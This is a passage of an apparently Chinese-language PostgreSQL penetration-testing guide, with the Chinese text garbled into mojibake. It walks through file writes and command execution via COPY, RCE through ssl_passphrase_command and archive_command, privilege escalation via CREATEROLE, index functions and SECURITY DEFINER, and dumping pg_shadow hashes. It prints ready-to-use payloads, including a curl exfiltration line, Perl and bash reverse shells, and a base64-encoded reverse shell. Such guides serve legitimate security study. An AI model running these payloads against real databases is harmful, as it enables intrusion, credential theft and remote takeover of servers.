### ç®€å•çš„æ–‡ä»¶å†™å…¥

åªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ**`pg_write_server_files`**çš„æˆå‘˜æ‰èƒ½ä½¿ç”¨copyå‘½ä»¤æ¥å†™å…¥æ–‡ä»¶ã€‚

{% code overflow="wrap" %}
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
{% endcode %}

{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†å…·æœ‰**`CREATEROLE`**æƒé™ï¼Œæ‚¨å¯ä»¥**å°†è‡ªå·±æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼š**
```sql
GRANT pg_write_server_files TO username;
```
[**æ›´å¤šä¿¡æ¯**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

è¯·è®°ä½ï¼ŒCOPYå‘½ä»¤æ— æ³•å¤„ç†æ¢è¡Œç¬¦ï¼Œå› æ­¤å³ä½¿æ‚¨ä½¿ç”¨çš„æ˜¯base64è´Ÿè½½ï¼Œ**æ‚¨ä¹Ÿéœ€è¦å‘é€ä¸€è¡Œå‘½ä»¤**ã€‚\
è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªéå¸¸é‡è¦çš„é™åˆ¶æ˜¯ï¼Œ**`copy`å‘½ä»¤æ— æ³•ç”¨äºå†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä¼šä¿®æ”¹ä¸€äº›äºŒè¿›åˆ¶å€¼**ã€‚

### **ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶**

ç„¶è€Œï¼Œè¿˜æœ‰**å…¶ä»–æŠ€æœ¯å¯ä»¥ä¸Šä¼ å¤§å‹äºŒè¿›åˆ¶æ–‡ä»¶**ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

## <img src="../.gitbook/assets/i3.png" alt="" data-size="original">

**Bugèµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**Bugèµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œè®¿é—®[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

## RCEï¼ˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼‰

### **RCEåˆ°ç¨‹åº**

è‡ª[9.3ç‰ˆæœ¬](https://www.postgresql.org/docs/9.3/release-9-3.html)ä»¥æ¥ï¼Œåªæœ‰**è¶…çº§ç”¨æˆ·**å’Œå±äº**`pg_execute_server_program`**ç»„çš„æˆå‘˜æ‰èƒ½ä½¿ç”¨copyå‘½ä»¤è¿›è¡ŒRCEï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æ•°æ®æ³„éœ²ï¼š
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
ç¤ºä¾‹æ‰§è¡Œå‘½ä»¤ï¼š
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†å…·æœ‰**`CREATEROLE`**æƒé™ï¼Œæ‚¨å¯ä»¥**å°†è‡ªå·±æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼š**
```sql
GRANT pg_execute_server_program TO username;
```
[**æ›´å¤šä¿¡æ¯**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

æˆ–è€…ä½¿ç”¨**metasploit**ä¸­çš„`multi/postgres/postgres_copy_from_program_cmd_exec`æ¨¡å—ã€‚æœ‰å…³æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯[**åœ¨è¿™é‡Œ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)ã€‚å°½ç®¡è¢«æŠ¥å‘Šä¸ºCVE-2019-9193ï¼Œä½†Postgeså®£å¸ƒè¿™æ˜¯ä¸€ä¸ª[åŠŸèƒ½ï¼Œä¸ä¼šä¿®å¤](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ã€‚

### ä½¿ç”¨PostgreSQLè¯­è¨€è¿›è¡ŒRCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### ä½¿ç”¨PostgreSQLæ‰©å±•è¿›è¡ŒRCE

ä¸€æ—¦ä½ ä»ä¹‹å‰çš„å¸–å­ä¸­**å­¦ä¼šäº†å¦‚ä½•ä¸Šä¼ äºŒè¿›åˆ¶æ–‡ä»¶**ï¼Œä½ å¯ä»¥å°è¯•é€šè¿‡ä¸Šä¼ postgresqlæ‰©å±•å¹¶åŠ è½½å®ƒæ¥è·å¾—**RCE**ã€‚

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQLé…ç½®æ–‡ä»¶RCE

Postgresqlçš„**é…ç½®æ–‡ä»¶**æ˜¯ç”±è¿è¡Œæ•°æ®åº“çš„**postgresç”¨æˆ·**æ‹¥æœ‰å†™æƒé™çš„ï¼Œå› æ­¤ä½œä¸º**è¶…çº§ç”¨æˆ·**ï¼Œæ‚¨å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å†™å…¥æ–‡ä»¶ï¼Œä»è€Œå¯ä»¥**è¦†ç›–æ­¤æ–‡ä»¶**ã€‚

![](<../.gitbook/assets/image (303).png>)

#### ä½¿ç”¨ssl\_passphrase\_commandè¿›è¡ŒRCE

é…ç½®æ–‡ä»¶å…·æœ‰ä¸€äº›æœ‰è¶£çš„å±æ€§ï¼Œå¯ä»¥å¯¼è‡´RCEï¼š

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` æ•°æ®åº“ç§é’¥çš„è·¯å¾„
* `ssl_passphrase_command = ''` å¦‚æœç§é’¥æ–‡ä»¶å—å¯†ç ä¿æŠ¤ï¼ˆåŠ å¯†ï¼‰ï¼ŒPostgresqlå°†**æ‰§è¡Œæ­¤å±æ€§ä¸­æŒ‡å®šçš„å‘½ä»¤**ã€‚
* `ssl_passphrase_command_supports_reload = off` å¦‚æœæ­¤å±æ€§ä¸º**on**ï¼Œåˆ™åœ¨æ‰§è¡Œ`pg_reload_conf()`æ—¶ï¼Œå¦‚æœå¯†é’¥å—å¯†ç ä¿æŠ¤ï¼Œå°†**æ‰§è¡Œå‘½ä»¤**ã€‚

ç„¶åï¼Œæ”»å‡»è€…éœ€è¦ï¼š

1. ä»æœåŠ¡å™¨**è½¬å‚¨ç§é’¥**
2. **åŠ å¯†**ä¸‹è½½çš„ç§é’¥ï¼š
   `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **è¦†ç›–**
4. **è½¬å‚¨**å½“å‰çš„postgresql **é…ç½®**
5. ä½¿ç”¨ä¸Šè¿°å±æ€§é…ç½®**è¦†ç›–**é…ç½®ï¼š
   `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
   `ssl_passphrase_command_supports_reload = on`
6. æ‰§è¡Œ`pg_reload_conf()`

åœ¨æµ‹è¯•ä¸­ï¼Œæˆ‘æ³¨æ„åˆ°è¿™åªæœ‰åœ¨**ç§é’¥æ–‡ä»¶å…·æœ‰640æƒé™**ï¼Œå®ƒæ˜¯**ç”±rootæ‹¥æœ‰**å¹¶ä¸”ç”±**ssl-certæˆ–postgresç»„**æ‹¥æœ‰ï¼ˆå› æ­¤postgresç”¨æˆ·å¯ä»¥è¯»å–å®ƒï¼‰ï¼Œå¹¶ä¸”ä½äº_/var/lib/postgresql/12/main_ã€‚

æœ‰å…³æ­¤æŠ€æœ¯çš„**æ›´å¤š**[**ä¿¡æ¯åœ¨è¿™é‡Œ**](https://pulsesecurity.co.nz/articles/postgres-sqli)**ã€‚**

#### ä½¿ç”¨archive\_commandè¿›è¡ŒRCE

é…ç½®æ–‡ä»¶ä¸­çš„å¦ä¸€ä¸ªå¯åˆ©ç”¨çš„å±æ€§æ˜¯`archive_command`ã€‚

è¦ä½¿å…¶å·¥ä½œï¼Œ`archive_mode`è®¾ç½®å¿…é¡»ä¸º`'on'`æˆ–`'always'`ã€‚å¦‚æœä¸ºçœŸï¼Œåˆ™å¯ä»¥è¦†ç›–`archive_command`ä¸­çš„å‘½ä»¤ï¼Œå¹¶é€šè¿‡WALï¼ˆé¢„å†™å¼æ—¥å¿—ï¼‰æ“ä½œå¼ºåˆ¶æ‰§è¡Œå®ƒã€‚

ä¸€èˆ¬æ­¥éª¤å¦‚ä¸‹ï¼š

1. æ£€æŸ¥æ˜¯å¦å¯ç”¨äº†å½’æ¡£æ¨¡å¼ï¼š`SELECT current_setting('archive_mode')`
2. ä½¿ç”¨æœ‰æ•ˆè½½è·è¦†ç›–`archive_command`ã€‚ä¾‹å¦‚ï¼Œåå‘shellï¼š`archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. é‡æ–°åŠ è½½é…ç½®ï¼š`SELECT pg_reload_conf()`
4. å¼ºåˆ¶è¿è¡ŒWALæ“ä½œï¼Œè¿™å°†è°ƒç”¨å½’æ¡£å‘½ä»¤ï¼š`SELECT pg_switch_wal()`æˆ–æŸäº›Postgresç‰ˆæœ¬çš„`SELECT pg_switch_xlog()`

æœ‰å…³æ­¤é…ç½®å’ŒWALçš„**æ›´å¤š**[**ä¿¡æ¯åœ¨è¿™é‡Œ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**ã€‚**

## **Postgresæƒé™æå‡**

### CREATEROLEæƒé™æå‡

#### **æˆæƒ**

æ ¹æ®[**æ–‡æ¡£**](https://www.postgresql.org/docs/13/sql-grant.html)ï¼š_å…·æœ‰**`CREATEROLE`**æƒé™çš„è§’è‰²å¯ä»¥**æˆäºˆæˆ–æ’¤é”€ä»»ä½•ä¸æ˜¯è¶…çº§ç”¨æˆ·çš„è§’è‰²**çš„æˆå‘˜èµ„æ ¼ã€‚_

å› æ­¤ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰**`CREATEROLE`**æƒé™ï¼Œæ‚¨å¯ä»¥æˆäºˆè‡ªå·±è®¿é—®å…¶ä»–**è§’è‰²**ï¼ˆä¸æ˜¯è¶…çº§ç”¨æˆ·ï¼‰çš„æƒé™ï¼Œè¿™å¯ä»¥ä½¿æ‚¨èƒ½å¤Ÿè¯»å–å’Œå†™å…¥æ–‡ä»¶ä»¥åŠæ‰§è¡Œå‘½ä»¤ï¼š
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### ä¿®æ”¹å¯†ç 

å…·æœ‰æ­¤è§’è‰²çš„ç”¨æˆ·è¿˜å¯ä»¥æ›´æ”¹å…¶ä»–éè¶…çº§ç”¨æˆ·çš„å¯†ç ï¼š
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### æå‡ä¸ºè¶…çº§ç”¨æˆ·

å¾ˆå¸¸è§çš„æƒ…å†µæ˜¯ï¼Œ**æœ¬åœ°ç”¨æˆ·å¯ä»¥åœ¨ PostgreSQL ä¸­æ— éœ€æä¾›ä»»ä½•å¯†ç å°±ç™»å½•**ã€‚å› æ­¤ï¼Œä¸€æ—¦ä½ è·å¾—äº†**æ‰§è¡Œä»£ç çš„æƒé™**ï¼Œä½ å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥è·å–**`SUPERUSER`**è§’è‰²ï¼š
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
è¿™é€šå¸¸æ˜¯ç”±äº**`pg_hba.conf`**æ–‡ä»¶ä¸­çš„ä»¥ä¸‹è¡Œå¯¼è‡´çš„ï¼š
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLEææƒ**

åœ¨[è¿™ç¯‡**æ–‡ç« **](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)ä¸­è§£é‡Šäº†å¦‚ä½•åˆ©ç”¨Postgres GCPä¸­æˆäºˆç”¨æˆ·çš„ALTER TABLEæƒé™æ¥è¿›è¡Œææƒã€‚

å½“æ‚¨å°è¯•å°†å¦ä¸€ä¸ªç”¨æˆ·è®¾ç½®ä¸ºè¡¨çš„æ‰€æœ‰è€…æ—¶ï¼Œåº”è¯¥ä¼šå‡ºç°ä¸€ä¸ª**é”™è¯¯**æ¥é˜»æ­¢å®ƒï¼Œä½†æ˜¾ç„¶GCPå…è®¸éè¶…çº§ç”¨æˆ·postgresç”¨æˆ·æ‹¥æœ‰è¯¥é€‰é¡¹ï¼š

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

å°†è¿™ä¸ªæƒ³æ³•ä¸ä»¥ä¸‹äº‹å®ç»“åˆèµ·æ¥ï¼Œå³å½“åœ¨å…·æœ‰ç´¢å¼•å‡½æ•°çš„è¡¨ä¸Šæ‰§è¡ŒINSERT/UPDATE/ANALYZEå‘½ä»¤æ—¶ï¼Œè¯¥å‡½æ•°å°†ä½œä¸ºå‘½ä»¤çš„ä¸€éƒ¨åˆ†ä»¥è¡¨æ‰€æœ‰è€…çš„æƒé™æ¥è°ƒç”¨ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰å‡½æ•°çš„ç´¢å¼•ï¼Œå¹¶å°†æ‰€æœ‰è€…æƒé™æˆäºˆè¶…çº§ç”¨æˆ·ï¼Œç„¶åä½¿ç”¨æ¶æ„å‡½æ•°å¯¹è¡¨è¿›è¡ŒANALYZEï¼Œè¯¥å‡½æ•°å°†èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºå®ƒä½¿ç”¨æ‰€æœ‰è€…çš„æƒé™ã€‚
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### æ¼æ´åˆ©ç”¨

1. åˆ›å»ºä¸€ä¸ªæ–°è¡¨ã€‚
2. å‘è¡¨ä¸­æ’å…¥ä¸€äº›è™šæ‹Ÿå†…å®¹ï¼Œä»¥ä¾¿ç´¢å¼•å‡½æ•°æœ‰å¯æ“ä½œçš„å†…å®¹ã€‚
3. åœ¨è¡¨ä¸Šåˆ›å»ºä¸€ä¸ªæ¶æ„çš„ç´¢å¼•å‡½æ•°ï¼ˆåŒ…å«æˆ‘ä»¬çš„ä»£ç æ‰§è¡Œè½½è·ï¼‰ã€‚
4. å°†è¡¨çš„æ‰€æœ‰è€…æ›´æ”¹ä¸º cloudsqladminï¼ŒGCP çš„è¶…çº§ç”¨æˆ·è§’è‰²ï¼Œä»…ç”± Cloud SQL ç”¨äºç»´æŠ¤å’Œç®¡ç†æ•°æ®åº“ã€‚
5. å¯¹è¡¨è¿›è¡Œ ANALYZE æ“ä½œï¼Œå¼ºåˆ¶ PostgreSQL å¼•æ“åˆ‡æ¢åˆ°è¡¨çš„æ‰€æœ‰è€…ï¼ˆcloudsqladminï¼‰çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ï¼Œå¹¶ä½¿ç”¨ cloudsqladmin æƒé™è°ƒç”¨æ¶æ„ç´¢å¼•å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬ä¹‹å‰æ²¡æœ‰æƒé™æ‰§è¡Œçš„ shell å‘½ä»¤ã€‚

åœ¨ PostgreSQL ä¸­ï¼Œè¿™ä¸ªæµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
åœ¨æ‰§è¡Œåˆ©ç”¨SQLæŸ¥è¯¢ä¹‹åï¼Œ`shell_commands_results`è¡¨ä¸­åŒ…å«äº†æ‰§è¡Œä»£ç çš„è¾“å‡ºç»“æœï¼š
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### æœ¬åœ°ç™»å½•

ä¸€äº›é…ç½®é”™è¯¯çš„PostgreSQLå®ä¾‹å¯èƒ½å…è®¸ä»»ä½•æœ¬åœ°ç”¨æˆ·ç™»å½•ï¼Œå¯ä»¥ä½¿ç”¨**`dblink`å‡½æ•°**ä»127.0.0.1æœ¬åœ°ç™»å½•ï¼š
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†ä½¿ä¸Šè¿°æŸ¥è¯¢å·¥ä½œï¼Œ**éœ€è¦å­˜åœ¨å‡½æ•° `dblink`**ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºå®ƒï¼š
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

å¦‚æœä½ æ‹¥æœ‰ä¸€ä¸ªæƒé™æ›´é«˜çš„ç”¨æˆ·çš„å¯†ç ï¼Œä½†è¯¥ç”¨æˆ·ä¸å…è®¸ä»å¤–éƒ¨IPç™»å½•ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ä»¥è¯¥ç”¨æˆ·çš„èº«ä»½æ‰§è¡ŒæŸ¥è¯¢ï¼š
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ¥æ£€æŸ¥è¯¥å‡½æ•°æ˜¯å¦å­˜åœ¨ï¼š
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **å…·æœ‰** SECURITY DEFINER **çš„è‡ªå®šä¹‰å®šä¹‰å‡½æ•°**

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)ä¸­ï¼Œæ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿåœ¨ç”±IBMæä¾›çš„postgreså®ä¾‹ä¸­æå‡æƒé™ï¼Œå› ä¸ºä»–ä»¬**å‘ç°äº†å…·æœ‰** SECURITY DEFINER **æ ‡å¿—çš„è¿™ä¸ªå‡½æ•°**ï¼š

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

æ­£å¦‚[**æ–‡æ¡£ä¸­æ‰€è§£é‡Šçš„**](https://www.postgresql.org/docs/current/sql-createfunction.html)ï¼Œå…·æœ‰**SECURITY DEFINERçš„å‡½æ•°**ä»¥**æ‹¥æœ‰å®ƒçš„ç”¨æˆ·çš„æƒé™**æ‰§è¡Œã€‚å› æ­¤ï¼Œå¦‚æœå‡½æ•°**å®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»**ï¼Œæˆ–è€…ä½¿ç”¨ç”±æ”»å‡»è€…æ§åˆ¶çš„å‚æ•°æ‰§è¡Œä¸€äº›**ç‰¹æƒæ“ä½œ**ï¼Œåˆ™å¯ä»¥æ»¥ç”¨è¯¥å‡½æ•°æ¥**æå‡åœ¨postgresä¸­çš„æƒé™**ã€‚

åœ¨ä¸Šè¿°ä»£ç çš„ç¬¬4è¡Œä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°å…·æœ‰**SECURITY DEFINER**æ ‡å¿—ã€‚
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
ç„¶åæ‰§è¡Œå‘½ä»¤ï¼š

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### ä½¿ç”¨PL/pgSQLè¿›è¡Œå¯†ç æš´åŠ›ç ´è§£

ä½œä¸ºä¸€ä¸ªåŠŸèƒ½é½å…¨çš„ç¼–ç¨‹è¯­è¨€ï¼ŒPL/pgSQLæ¯”SQLå…·æœ‰æ›´å¤šçš„è¿‡ç¨‹æ§åˆ¶èƒ½åŠ›ï¼ŒåŒ…æ‹¬ä½¿ç”¨å¾ªç¯å’Œå…¶ä»–æ§åˆ¶ç»“æ„çš„èƒ½åŠ›ã€‚SQLè¯­å¥å’Œè§¦å‘å™¨å¯ä»¥è°ƒç”¨ä½¿ç”¨PL/pgSQLè¯­è¨€åˆ›å»ºçš„å‡½æ•°ã€‚\
**æ‚¨å¯ä»¥æ»¥ç”¨è¿™ç§è¯­è¨€æ¥è¦æ±‚PostgreSQLå¯¹ç”¨æˆ·å‡­æ®è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£ã€‚**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### æ—¥å¿—è®°å½•

åœ¨ _**postgresql.conf**_ æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ›´æ”¹ä»¥ä¸‹å†…å®¹æ¥å¯ç”¨ PostgreSQL æ—¥å¿—è®°å½•ï¼š
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
ç„¶åï¼Œ**é‡æ–°å¯åŠ¨æœåŠ¡**ã€‚

### pgadmin

[pgadmin](https://www.pgadmin.org) æ˜¯ç”¨äº PostgreSQL çš„ç®¡ç†å’Œå¼€å‘å¹³å°ã€‚\
æ‚¨å¯ä»¥åœ¨ _**pgadmin4.db**_ æ–‡ä»¶ä¸­æ‰¾åˆ°**å¯†ç **ã€‚\
æ‚¨å¯ä»¥ä½¿ç”¨è„šæœ¬ä¸­çš„ _**decrypt**_ å‡½æ•°å¯¹å…¶è¿›è¡Œè§£å¯†ï¼š[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

å®¢æˆ·ç«¯è®¤è¯ç”±ä¸€ä¸ªåä¸º **pg\_hba.conf** çš„é…ç½®æ–‡ä»¶æ§åˆ¶ã€‚è¯¥æ–‡ä»¶åŒ…å«ä¸€ç»„è®°å½•ã€‚æ¯ä¸ªè®°å½•å¯ä»¥æœ‰ä»¥ä¸‹ä¸ƒç§æ ¼å¼ä¹‹ä¸€ï¼š

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**æ¯ä¸ª**è®°å½•**æŒ‡å®š**ä¸€ä¸ª**è¿æ¥ç±»å‹**ï¼Œä¸€ä¸ª**å®¢æˆ·ç«¯ IP åœ°å€èŒƒå›´**ï¼ˆå¦‚æœå¯¹äºè¿æ¥ç±»å‹æœ‰å…³ï¼‰ï¼Œä¸€ä¸ª**æ•°æ®åº“åç§°**ï¼Œä¸€ä¸ª**ç”¨æˆ·å**ï¼Œä»¥åŠç”¨äºåŒ¹é…è¿™äº›å‚æ•°çš„è¿æ¥çš„**è®¤è¯æ–¹æ³•**ã€‚é€‰æ‹©ä¸è¿æ¥ç±»å‹ã€å®¢æˆ·ç«¯åœ°å€ã€è¯·æ±‚çš„æ•°æ®åº“å’Œç”¨æˆ·å**åŒ¹é…çš„ç¬¬ä¸€ä¸ªè®°å½•**ç”¨äºæ‰§è¡Œè®¤è¯ã€‚æ²¡æœ‰â€œé€çº§â€æˆ–â€œå¤‡ä»½â€ï¼š**å¦‚æœé€‰æ‹©äº†ä¸€ä¸ªè®°å½•å¹¶ä¸”è®¤è¯å¤±è´¥ï¼Œåç»­çš„è®°å½•å°†ä¸è¢«è€ƒè™‘**ã€‚å¦‚æœæ²¡æœ‰è®°å½•åŒ¹é…ï¼Œåˆ™æ‹’ç»è®¿é—®ã€‚\
åŸºäºå¯†ç çš„è®¤è¯æ–¹æ³•æœ‰ **md5**ã€**crypt** å’Œ **password**ã€‚è¿™äº›æ–¹æ³•çš„æ“ä½œæ–¹å¼ç±»ä¼¼ï¼Œåªæ˜¯å¯†ç åœ¨è¿æ¥ä¸­å‘é€çš„æ–¹å¼ä¸åŒï¼šåˆ†åˆ«æ˜¯ MD5 å“ˆå¸Œã€crypt åŠ å¯†å’Œæ˜æ–‡ã€‚ä¸€ä¸ªé™åˆ¶æ˜¯ crypt æ–¹æ³•ä¸èƒ½ä¸åœ¨ pg\_authid ä¸­åŠ å¯†çš„å¯†ç ä¸€èµ·ä½¿ç”¨ã€‚
